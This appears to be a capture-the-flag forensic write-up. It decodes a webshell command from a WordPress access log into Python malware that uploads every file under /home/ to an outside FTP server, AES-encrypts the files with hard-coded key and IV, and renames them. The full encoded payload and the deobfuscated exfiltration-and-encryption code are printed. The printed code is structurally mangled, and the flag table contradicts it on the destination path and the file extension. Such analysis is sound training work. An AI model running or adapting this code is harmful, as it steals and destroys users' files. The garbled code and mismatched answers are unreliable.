# can't you read that??? - 100

The chall tell us to analyze the `access.log` from the [All that data???](https://github.com/NeKroFR/Writeups/blob/main/Hackday/2024/Forensic/all%20that%20data.md) and that the flag format is:
`HACKDAY{encryption_iv:encryption_key:attacker_ip:attacker_port:data_destination_path:data_source_path:encrypted_file_extension}`

The interesting part of the log is the end:

```
10.0.3.250 - - [04/May/2023:10:41:06 +0200] "GET /wp-content/plugins/wp_webshell/wp_webshell.php?action=exec&cmd=python3+-c+%22import%20zlib%20;%20import%20base64%20;%20exec(zlib.decompress(base64.b64decode(%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%27)))%22 HTTP/1.1" 200 6288 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"%                               
```

We can decode it with this python script:
```py
import base64, zlib

payload = "%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%27".replace("%27", "")
code = zlib.decompress(base64.b64decode(payload))
with open("code.py", "wb") as f:
    f.write(code)
```
and we now have a `code.py` file wich is obfuscated.
After desobfuscating it we get:
```py
from Crypto.Cipher import AES as AES
import socket as socket
import json as json
import os as os
import base64 as base64
import time as time
import ftplib as ftplib
import random as random


def upload_to_ftp_server(file_path):
    ftpServer = ftplib.FTP()
    ftpServer.connect("13.98.138.213", 20304)
    ftpServer.login("anonymous", "anonymous")
    ftpServer.cwd("/srv/ooowldump/")
    ftpServer.storbinary('\'\'' + '\'S\'' + file_path, open(file_path, "rb"))
    ftpServer.quit()
    def encrypt_file(file_path):
        key = AES.new("vLuUbS2o4i6Pr8jX", AES.MODE_CBC, "bM8ftekoUEWCTbP5")
        with open(file_path, "rb") as file:
                    file_content = file.read()
                    padded_data = add_padding(file_content)
                    encrypted_data = key.encrypt(padded_data)
        with open(file_path, "wb") as file:
                file.write(encrypted_data)
        
        def find_files(directory):
            file_list = []
            for root, dirs, files in os.walk(directory):
                for file_name in files:
                    file_list.append(os.path.join(root, file_name))
            return file_list
        def add_padding(data):
            return data + b"\\0" * (AES.block_size - len(data) % AES.block_size)
        
        for file_path in find_files('/home/'):
            upload_to_ftp_server(file_path)
            encrypt_file(file_path)
            os.rename(file_path, file_path + '\'n\''[:-1] + "nc") #nnc
        return "anonymous"
```

So after some analyze we can easyly get the flag:

|part | value |
|---|---|
| encryption_iv | bM8ftekoUEWCTbP5 |
| encryption_key | vLuUbS2o4i6Pr8jX |
| attacker_ip | 13.98.138.213 |
| attacker_port | 20304 |
| data_destination_path | /srv/www/dump/ |
| data_source_path | /home/ |
| encrypted_file_extension | .enc |
